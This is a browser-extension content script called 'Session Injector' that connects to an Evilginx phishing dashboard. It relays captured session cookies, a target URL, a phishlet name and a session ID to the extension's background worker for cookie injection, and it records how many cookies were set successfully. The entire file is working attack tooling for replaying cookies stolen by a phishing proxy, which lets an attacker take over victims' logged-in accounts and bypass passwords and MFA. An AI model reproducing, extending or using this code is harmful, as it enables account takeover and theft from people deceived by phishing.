// Session Injector — content script
// Activates only on pages that identify as the evilginx dashboard,
// bridges inject requests to the background worker, and tracks session
// selection state for the extension popup.

(function () {
  if (!document.body || document.body.dataset.app !== 'evilginx-dashboard') return;

  // Signal presence to the dashboard JS.
  window.__evilginxExtension = true;
  document.dispatchEvent(new CustomEvent('evilginx-extension-ready'));

  // Mark dashboard as reachable for the popup.
  chrome.storage.local.set({
    dashboardConnected: true,
    dashboardUrl: window.location.origin
  });

  // Clean up when the tab is unloaded.
  window.addEventListener('unload', function () {
    chrome.storage.local.set({ dashboardConnected: false });
  });

  window.addEventListener('message', function (event) {
    if (event.source !== window || !event.data) return;

    // Inject request from dashboard.
    if (event.data.type === 'EVILGINX_INJECT') {
      var payload = event.data.payload;
      chrome.runtime.sendMessage(
        { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
        function (result) {
          var r = result || {};
          // Store result for popup display.
          chrome.storage.local.set({ lastInject: {
            sessionId: payload.session_id,
            phishlet:  payload.phishlet,
            count:     r.success || 0,
            failed:    r.failed  || 0,
            targetUrl: payload.target_url,
            time:      Date.now()
          }});
          // Forward result back to dashboard page.
          window.dispatchEvent(new CustomEvent('evilginx-inject-result', { detail: r }));
        }
      );
    }

    // Session selected in dashboard — store for popup.
    if (event.data.type === 'EVILGINX_SESSION_SELECT') {
      chrome.storage.local.set({ currentSession: event.data.payload });
    }
  });
})();
